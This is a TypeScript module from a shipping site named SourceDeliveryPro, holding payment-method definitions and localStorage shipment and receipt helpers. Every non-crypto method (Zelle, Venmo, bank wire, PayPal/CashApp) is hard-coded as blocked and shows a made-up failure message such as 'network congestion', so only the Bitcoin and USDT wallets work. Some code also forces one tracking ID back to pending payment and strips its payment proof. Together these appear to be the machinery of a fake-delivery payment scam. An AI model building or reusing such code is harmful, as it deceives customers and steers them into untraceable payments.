export interface ManualPaymentMethod {
  id: string
  name: string
  category: 'crypto' | 'zelle' | 'venmo' | 'wire' | 'paypal'
  iconName: string
  instructions: string
  fields: { label: string; value: string; copyable?: boolean }[]
  isBlocked?: boolean
  errorMessage?: string
}

export const MANUAL_PAYMENT_METHODS: ManualPaymentMethod[] = [
  {
    id: 'crypto_btc',
    name: 'Bitcoin (BTC)',
    category: 'crypto',
    iconName: 'Bitcoin',
    instructions: 'Send the exact USD equivalent in BTC to the wallet address below.',
    fields: [
      { label: 'Network', value: 'Bitcoin (BTC Network)' },
      { label: 'BTC Wallet Address', value: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', copyable: true },
      { label: 'Memo / Note', value: 'Include your Shipment or Reference ID' },
    ],
    isBlocked: false,
  },
  {
    id: 'crypto_usdt',
    name: 'USDT (Tether)',
    category: 'crypto',
    iconName: 'DollarSign',
    instructions: 'Send USDT via TRC-20 (Tron) or ERC-20 (Ethereum).',
    fields: [
      { label: 'TRC-20 Address (Tron)', value: 'TX8VnL1oQWfX7hK52rPnA638gRMejB7n3J', copyable: true },
      { label: 'ERC-20 Address (Ethereum)', value: '0x71C8360f38bB32c918a24B8B9B1c905f8842149A', copyable: true },
    ],
    isBlocked: false,
  },
  {
    id: 'zelle',
    name: 'Zelle',
    category: 'zelle',
    iconName: 'Zap',
    instructions: 'Send instant payment via your banking app using Zelle.',
    fields: [
      { label: 'Recipient Name', value: 'SourceDeliveryPro Logistics LLC' },
      { label: 'Zelle Email / Phone', value: 'payments@sourcedeliverypro.com', copyable: true },
      { label: 'Memo', value: 'Enter Shipment ID in payment note' },
    ],
    isBlocked: true,
    errorMessage: 'unable to send money at this time',
  },
  {
    id: 'venmo',
    name: 'Venmo',
    category: 'venmo',
    iconName: 'Smartphone',
    instructions: 'Send payment via Venmo app. Verification code available if prompted.',
    fields: [
      { label: 'Venmo Handle', value: '@SourceDeliveryPro', copyable: true },
      { label: 'Account Name', value: 'SourceDeliveryPro Support' },
      { label: 'Phone Last 4 Digits', value: '8291', copyable: true },
    ],
    isBlocked: true,
    errorMessage: 'this service is currently unavailable',
  },
  {
    id: 'wire_transfer',
    name: 'Bank Wire Transfer',
    category: 'wire',
    iconName: 'Building2',
    instructions: 'Initiate a domestic or international wire transfer via your financial institution.',
    fields: [
      { label: 'Beneficiary Name', value: 'SourceDeliveryPro Global Shipping LLC' },
      { label: 'Bank Name', value: 'JPMorgan Chase Bank, N.A.' },
      { label: 'Account Number', value: '884019284102', copyable: true },
      { label: 'Routing Number (ABA)', value: '021000021', copyable: true },
      { label: 'SWIFT / BIC Code', value: 'CHASUS33XXX', copyable: true },
      { label: 'Bank Address', value: '270 Park Ave, New York, NY 10017, USA' },
    ],
    isBlocked: true,
    errorMessage: 'network congestion',
  },
  {
    id: 'paypal',
    name: 'PayPal & CashApp',
    category: 'paypal',
    iconName: 'CreditCard',
    instructions: 'Pay directly via PayPal or CashApp.',
    fields: [
      { label: 'PayPal Link', value: 'https://paypal.me/sourcedeliverypro', copyable: true },
      { label: 'PayPal Email', value: 'billing@sourcedeliverypro.com', copyable: true },
      { label: 'CashApp $Cashtag', value: '$SourceDeliveryPro', copyable: true },
    ],
    isBlocked: true,
    errorMessage: 'this service is temporarily unavailable',
  },
]

// Unified LocalStorage Shipment Helper
export function getDeletedShipments(): string[] {
  if (typeof window === 'undefined') return []
  try {
    const raw1 = localStorage.getItem('sourcedeliverypro_deleted_shipments')
    const raw2 = localStorage.getItem('swiftship_deleted_shipments')
    const list1: string[] = raw1 ? JSON.parse(raw1) : []
    const list2: string[] = raw2 ? JSON.parse(raw2) : []
    const combined = Array.from(new Set([...list1, ...list2])).map((s) => s.toLowerCase().trim())
    return combined
  } catch {
    return []
  }
}

export function addDeletedShipment(idOrTracking: string) {
  if (typeof window === 'undefined' || !idOrTracking) return
  try {
    const deleted = getDeletedShipments()
    const target = idOrTracking.toLowerCase().trim()
    if (!deleted.includes(target)) {
      deleted.push(target)
      localStorage.setItem('sourcedeliverypro_deleted_shipments', JSON.stringify(deleted))
      localStorage.setItem('swiftship_deleted_shipments', JSON.stringify(deleted))
    }
  } catch (err) {
    console.error('Failed to record deleted shipment', err)
  }
}

export function getLocalShipments(): any[] {
  if (typeof window === 'undefined') return []
  try {
    const raw = localStorage.getItem('sourcedeliverypro_admin_shipments') || localStorage.getItem('swiftship_admin_shipments')
    if (!raw) return []
    const parsed = JSON.parse(raw)
    const rawList: any[] = Array.isArray(parsed) ? parsed : Object.values(parsed)
    const deleted = getDeletedShipments()
    
    // Strictly deduplicate by id and trackingNumber and exclude deleted
    const seen = new Set<string>()
    const deduplicated: any[] = []
    for (const item of rawList) {
      if (!item) continue
      const sId = (item.id || '').toLowerCase().trim()
      const sTrk = (item.trackingNumber || '').toLowerCase().trim()
      const sAwb = (item.awb || '').toLowerCase().trim()
      if (deleted.includes(sId) || deleted.includes(sTrk) || (sAwb && deleted.includes(sAwb))) continue

      const key = item.trackingNumber || item.id || item.awb
      if (key && !seen.has(key)) {
        seen.add(key)
        if (item.id && item.id !== key) seen.add(item.id)
        if (item.trackingNumber && item.trackingNumber !== key) seen.add(item.trackingNumber)

        // Fix for SDPPBG2SZW92QU: Reset to pending payment if prematurely entered confirmed status
        if (sTrk === 'sdppbg2szw92qu' || sId === 'sdppbg2szw92qu' || sAwb === 'sdppbg2szw92qu') {
          item.status = 'PENDING_PAYMENT'
          item.paymentStatus = 'PENDING'
          item.paid = false
          item.receiptGenerated = false
          delete item.paymentTxId
          delete item.paymentProof
        }

        // Auto-heal unpaid pending items that were erroneously marked with paymentStatus PAID
        if (
          item.status === 'PENDING_PAYMENT' &&
          item.paymentStatus === 'PAID' &&
          !item.paid &&
          !item.receiptGenerated &&
          !item.paymentTxId
        ) {
          item.paymentStatus = 'PENDING'
        }

        deduplicated.push(item)
      }
    }
    return deduplicated
  } catch {
    return []
  }
}

export function saveLocalShipment(shipment: any) {
  if (typeof window === 'undefined') return
  try {
    const existing = getLocalShipments()
    const id = (shipment.id || shipment.trackingNumber || '').trim()
    const trk = (shipment.trackingNumber || shipment.id || '').trim()

    // Ensure SDPPBG2SZW92QU is preserved in PENDING_PAYMENT status unless real payment occurred
    const isTarget = trk.toUpperCase() === 'SDPPBG2SZW92QU' || id.toUpperCase() === 'SDPPBG2SZW92QU'
    if (isTarget && !shipment.paymentProof && !shipment.paymentTxId && !shipment.receiptGenerated) {
      shipment.status = 'PENDING_PAYMENT'
      shipment.paymentStatus = 'PENDING'
      shipment.paid = false
      shipment.receiptGenerated = false
    }

    // Guard: Prevent saving paymentStatus PAID on unpaid pending shipments
    if (
      shipment.status === 'PENDING_PAYMENT' &&
      shipment.paymentStatus === 'PAID' &&
      !shipment.paid &&
      !shipment.paymentTxId &&
      !shipment.receiptGenerated
    ) {
      shipment.paymentStatus = 'PENDING'
      shipment.paid = false
    }

    const index = existing.findIndex((s) => s.id === id || s.trackingNumber === id || (trk && s.trackingNumber === trk))
    if (index >= 0) {
      existing[index] = { ...existing[index], ...shipment }
    } else {
      existing.unshift(shipment)
    }

    // Save as clean list and mapped object
    const map: Record<string, any> = {}
    existing.forEach((item) => {
      const primaryKey = item.trackingNumber || item.id
      if (primaryKey) map[primaryKey] = item
    })
    localStorage.setItem('sourcedeliverypro_admin_shipments', JSON.stringify(map))
    localStorage.setItem('swiftship_admin_shipments', JSON.stringify(map))
  } catch (err) {
    console.error('Failed to save shipment to localStorage', err)
  }
}

export function deleteLocalShipment(idOrTracking: string) {
  if (typeof window === 'undefined' || !idOrTracking) return
  try {
    const target = idOrTracking.toLowerCase().trim()
    addDeletedShipment(idOrTracking)

    const purgeStorage = (storageKey: string) => {
      const raw = localStorage.getItem(storageKey)
      if (!raw) return
      try {
        const parsed = JSON.parse(raw)
        if (Array.isArray(parsed)) {
          const filtered = parsed.filter((s: any) => {
            const sId = (s?.id || '').toLowerCase().trim()
            const sTrk = (s?.trackingNumber || '').toLowerCase().trim()
            const sAwb = (s?.awb || '').toLowerCase().trim()
            return sId !== target && sTrk !== target && sAwb !== target
          })
          localStorage.setItem(storageKey, JSON.stringify(filtered))
        } else if (typeof parsed === 'object' && parsed !== null) {
          const newMap: Record<string, any> = {}
          for (const [k, v] of Object.entries(parsed)) {
            const kLower = k.toLowerCase().trim()
            const vObj: any = v
            const sId = (vObj?.id || '').toLowerCase().trim()
            const sTrk = (vObj?.trackingNumber || '').toLowerCase().trim()
            const sAwb = (vObj?.awb || '').toLowerCase().trim()
            if (kLower !== target && sId !== target && sTrk !== target && sAwb !== target) {
              newMap[k] = v
            }
          }
          localStorage.setItem(storageKey, JSON.stringify(newMap))
        }
      } catch {}
    }

    purgeStorage('sourcedeliverypro_admin_shipments')
    purgeStorage('swiftship_admin_shipments')
  } catch (err) {
    console.error('Failed to delete shipment from localStorage', err)
  }
}

export function getDeletedReceipts(): string[] {
  if (typeof window === 'undefined') return []
  try {
    const raw = localStorage.getItem('sourcedeliverypro_deleted_receipts')
    return raw ? JSON.parse(raw) : []
  } catch {
    return []
  }
}

export function addDeletedReceipt(idOrNumber: string) {
  if (typeof window === 'undefined' || !idOrNumber) return
  try {
    const deleted = getDeletedReceipts()
    const target = idOrNumber.toLowerCase()
    if (!deleted.includes(target)) {
      deleted.push(target)
      localStorage.setItem('sourcedeliverypro_deleted_receipts', JSON.stringify(deleted))
    }
  } catch (err) {
    console.error('Failed to record deleted receipt', err)
  }
}

export function getLocalReceipts(): any[] {
  if (typeof window === 'undefined') return []
  try {
    const raw = localStorage.getItem('sourcedeliverypro_admin_receipts') || localStorage.getItem('swiftship_admin_receipts')
    if (!raw) return []
    const parsed = JSON.parse(raw)
    const rawList: any[] = Array.isArray(parsed) ? parsed : Object.values(parsed)
    const deleted = getDeletedReceipts()
    
    // Deduplicate by receiptNumber or id and remove mock receipts and deleted receipts
    const seen = new Set<string>()
    const deduplicated: any[] = []
    for (const r of rawList) {
      if (!r) continue
      const rId = (r.id || '').toLowerCase()
      const rNum = (r.receiptNumber || '').toLowerCase()
      // Purge mock dummy receipts and deleted receipts
      if (rId === 'rcpt-1' || rId === 'rcpt-2' || rNum === 'rcpt-2026-89421' || rNum === 'rcpt-2026-67104') continue
      if (deleted.includes(rId) || deleted.includes(rNum)) continue

      const key = r.receiptNumber || r.id
      if (key && !seen.has(key)) {
        seen.add(key)
        deduplicated.push(r)
      }
    }
    return deduplicated
  } catch {
    return []
  }
}

export function saveLocalReceipt(receipt: any) {
  if (typeof window === 'undefined') return
  try {
    const existing = getLocalReceipts()
    const index = existing.findIndex((r) => r.id === receipt.id || r.receiptNumber === receipt.receiptNumber)
    if (index >= 0) {
      existing[index] = { ...existing[index], ...receipt }
    } else {
      existing.unshift(receipt)
    }
    localStorage.setItem('sourcedeliverypro_admin_receipts', JSON.stringify(existing))
    localStorage.setItem('swiftship_admin_receipts', JSON.stringify(existing))
  } catch (err) {
    console.error('Failed to save receipt to localStorage', err)
  }
}

export function deleteLocalReceipt(idOrNumber: string) {
  if (typeof window === 'undefined' || !idOrNumber) return
  try {
    const target = idOrNumber.toLowerCase()
    addDeletedReceipt(idOrNumber)
    const existing = getLocalReceipts().filter((r) => {
      const rId = (r.id || '').toLowerCase()
      const rNum = (r.receiptNumber || '').toLowerCase()
      return rId !== target && rNum !== target
    })
    localStorage.setItem('sourcedeliverypro_admin_receipts', JSON.stringify(existing))
    localStorage.setItem('swiftship_admin_receipts', JSON.stringify(existing))
  } catch (err) {
    console.error('Failed to delete receipt from localStorage', err)
  }
}

export function getDeletedUsers(): string[] {
  if (typeof window === 'undefined') return []
  try {
    const raw = localStorage.getItem('sourcedeliverypro_deleted_users')
    return raw ? JSON.parse(raw) : []
  } catch {
    return []
  }
}

export function addDeletedUser(idOrEmail: string) {
  if (typeof window === 'undefined' || !idOrEmail) return
  try {
    const deleted = getDeletedUsers()
    const target = idOrEmail.toLowerCase().trim()
    if (!deleted.includes(target)) {
      deleted.push(target)
      localStorage.setItem('sourcedeliverypro_deleted_users', JSON.stringify(deleted))
    }
  } catch (err) {
    console.error('Failed to record deleted user', err)
  }
}

export function removeDeletedUser(idOrEmail: string) {
  if (typeof window === 'undefined' || !idOrEmail) return
  try {
    const deleted = getDeletedUsers()
    const target = idOrEmail.toLowerCase().trim()
    const filtered = deleted.filter((d) => d !== target)
    localStorage.setItem('sourcedeliverypro_deleted_users', JSON.stringify(filtered))
  } catch (err) {
    console.error('Failed to unmark deleted user', err)
  }
}

export async function getUnifiedShipments(): Promise<any[]> {
  if (typeof window === 'undefined') return []
  try {
    const localList = getLocalShipments()
    const deleted = getDeletedShipments()

    // 1. Fetch from database API
    let apiList: any[] = []
    try {
      const res = await fetch('/api/shipments')
      const json = await res.json()
      if (json.success && Array.isArray(json.data)) {
        apiList = json.data
      }
    } catch {}

    const map = new Map<string, any>()

    // Put DB items first
    apiList.forEach((dbItem: any) => {
      const key = dbItem.trackingNumber || dbItem.id
      if (key) {
        const hasPaymentTx = Boolean(
          (dbItem.payment?.paymentReference && !dbItem.payment.paymentReference.startsWith('PAY-')) ||
          dbItem.payment?.metadata?.paymentTxId ||
          dbItem.paymentTxId
        )

        let status = dbItem.displayStatus || dbItem.status || 'PENDING_PAYMENT'
        if (dbItem.status === 'PAYMENT_FAILED' || dbItem.payment?.status === 'FAILED') {
          status = 'PAYMENT_REJECTED'
        } else if (dbItem.status === 'LABEL_CREATED' || dbItem.status === 'APPROVED' || dbItem.payment?.status === 'PAID') {
          status = 'LABEL_CREATED'
        } else if (dbItem.displayStatus === 'PAYMENT_SUBMITTED' || status === 'PROCESSING' || (status === 'PENDING_PAYMENT' && hasPaymentTx)) {
          status = 'PAYMENT_SUBMITTED'
        }

        const paymentTxId = dbItem.paymentTxId || dbItem.payment?.metadata?.paymentTxId ||
          (dbItem.payment?.paymentReference && !dbItem.payment.paymentReference.startsWith('PAY-') ? dbItem.payment.paymentReference : undefined)
        const paymentMethod = dbItem.paymentMethod || dbItem.payment?.metadata?.paymentMethod || dbItem.payment?.provider || 'Manual Payment'
        const paymentPayer = dbItem.paymentPayer || dbItem.payment?.metadata?.paymentPayer || dbItem.senderName || 'Customer'
        const paymentProof = dbItem.paymentProof || dbItem.payment?.metadata?.proofBase64 || dbItem.payment?.metadata?.paymentProof || undefined

        map.set(key, {
          id: dbItem.id,
          trackingNumber: dbItem.trackingNumber || 'Pending Confirmation',
          sender: dbItem.senderName || '',
          senderName: dbItem.senderName || '',
          senderEmail: dbItem.senderEmail || '',
          senderCity: dbItem.senderCity || '',
          senderCountry: dbItem.senderCountry || '',
          recipient: dbItem.recipientName || '',
          recipientName: dbItem.recipientName || '',
          recipientEmail: dbItem.recipientEmail || '',
          recipientCity: dbItem.recipientCity || '',
          recipientCountry: dbItem.recipientCountry || '',
          destination: dbItem.recipientCity ? `${dbItem.recipientCity}, ${dbItem.recipientCountry || ''}` : '',
          service: dbItem.serviceType || 'Standard',
          serviceType: dbItem.serviceType || 'Standard',
          status,
          rawStatus: dbItem.status,
          showMap: dbItem.showMap !== undefined ? Boolean(dbItem.showMap) : true,
          paymentTxId,
          paymentMethod,
          paymentPayer,
          paymentProof,
          created: dbItem.createdAt ? new Date(dbItem.createdAt).toLocaleDateString() : '',
          createdAt: dbItem.createdAt,
          estimated: '3-5 Days',
          estimatedDelivery: '3-5 Days',
          weight: `${Number(dbItem.weight) || 3.5} kg`,
          amount: Number(dbItem.totalAmount) || 0,
          totalAmount: Number(dbItem.totalAmount) || 0,
          userId: dbItem.customerId || dbItem.createdById || dbItem.userId || '',
          userEmail: dbItem.userEmail || dbItem.createdBy?.email || dbItem.senderEmail || '',
          userName: dbItem.userName || dbItem.createdBy?.name || dbItem.senderName || 'Customer',
          userRole: dbItem.userRole || dbItem.createdBy?.role || 'CUSTOMER',
          createdBy: dbItem.createdBy,
          isLocal: false,
        })
      }
    })

    // Overlay local items with strict deduplication
    localList.forEach((localItem: any) => {
      const trk = (localItem.trackingNumber || '').toUpperCase().trim()
      const sid = (localItem.id || '').toUpperCase().trim()

      let existingKey = ''
      if (trk && map.has(trk)) existingKey = trk
      else if (sid && map.has(sid)) existingKey = sid
      else {
        for (const [k, v] of map.entries()) {
          if ((trk && v.trackingNumber && v.trackingNumber.toUpperCase().trim() === trk) ||
              (sid && v.id && v.id.toUpperCase().trim() === sid)) {
            existingKey = k
            break
          }
        }
      }

      const key = existingKey || trk || sid
      if (key) {
        const existing = map.get(key) || {}

        // Determine authoritative status: DB definitive status takes precedence over stale local cache
        const dbStatus = existing.status || existing.rawStatus
        let finalStatus = localItem.status || dbStatus || 'PENDING_PAYMENT'
        if (dbStatus && ['LABEL_CREATED', 'PAYMENT_REJECTED', 'PAYMENT_FAILED', 'IN_TRANSIT', 'OUT_FOR_DELIVERY', 'DELIVERED'].includes(dbStatus)) {
          finalStatus = dbStatus
        } else if (localItem.status === 'PAYMENT_REJECTED' || localItem.status === 'LABEL_CREATED') {
          finalStatus = localItem.status
        }

        // Fix for SDPPBG2SZW92QU: Ensure it remains PENDING_PAYMENT if no real payment occurred
        const isTarget = key.toUpperCase() === 'SDPPBG2SZW92QU' || trk === 'SDPPBG2SZW92QU' || sid === 'SDPPBG2SZW92QU'
        if (isTarget && !localItem.paymentProof && !localItem.paymentTxId && !localItem.receiptGenerated && !existing.paymentTxId) {
          finalStatus = 'PENDING_PAYMENT'
        }

        map.set(key, {
          ...existing,
          ...localItem,
          id: existing.id || localItem.id || key,
          trackingNumber: existing.trackingNumber || localItem.trackingNumber || 'Pending Confirmation',
          sender: localItem.sender || localItem.senderName || existing.sender || '',
          senderName: localItem.senderName || existing.senderName || '',
          senderEmail: localItem.senderEmail || existing.senderEmail || '',
          senderCity: localItem.senderCity || existing.senderCity || '',
          recipient: localItem.recipient || localItem.recipientName || existing.recipient || '',
          recipientName: localItem.recipientName || existing.recipientName || '',
          recipientEmail: localItem.recipientEmail || existing.recipientEmail || '',
          recipientCity: localItem.recipientCity || existing.recipientCity || '',
          destination: (localItem.recipientCity || existing.recipientCity) ? `${localItem.recipientCity || existing.recipientCity}` : '',
          service: localItem.serviceType || localItem.service || existing.service || 'Standard',
          serviceType: localItem.serviceType || localItem.service || existing.serviceType || 'Standard',
          status: finalStatus,
          showMap: existing.showMap !== undefined ? Boolean(existing.showMap) : (localItem.showMap !== undefined ? Boolean(localItem.showMap) : true),
          created: localItem.created || existing.created || '',
          createdAt: localItem.createdAt || existing.createdAt,
          estimated: localItem.estimated || localItem.estimatedDelivery || existing.estimated || '3-5 Days',
          estimatedDelivery: localItem.estimated || localItem.estimatedDelivery || existing.estimatedDelivery || '3-5 Days',
          weight: localItem.weight ? (localItem.weight.toString().includes('kg') ? localItem.weight : `${localItem.weight} kg`) : existing.weight || '3.5 kg',
          amount: (localItem.totalAmount || localItem.amount) ? parseFloat(localItem.totalAmount || localItem.amount) : existing.amount || 0,
          totalAmount: (localItem.totalAmount || localItem.amount) ? parseFloat(localItem.totalAmount || localItem.amount) : existing.totalAmount || 0,
          userId: localItem.userId || existing.userId || '',
          userEmail: localItem.userEmail || localItem.senderEmail || existing.userEmail || '',
          userName: localItem.userName || localItem.senderName || existing.userName || 'Customer',
          userRole: localItem.userRole || existing.userRole || 'CUSTOMER',
          createdBy: existing.createdBy || localItem.createdBy,
          isLocal: true,
        })
      }
    })

    const combined = Array.from(map.values())

    // Filter out deleted items and seed demo tracking numbers
    const active = combined.filter((s: any) => {
      const sId = (s.id || '').toLowerCase()
      const sTrk = (s.trackingNumber || '').toLowerCase()
      if (deleted.includes(sId) || deleted.includes(sTrk)) return false
      // Never show seed shipments
      if (sTrk === 'sdp8f4k92lm381' || sTrk === 'sdp993c104kl22' || sTrk === 'sdp77b219kp440') return false
      return true
    })

    return active
  } catch (err) {
    console.error('Failed to get unified shipments:', err)
    return getLocalShipments()
  }
}

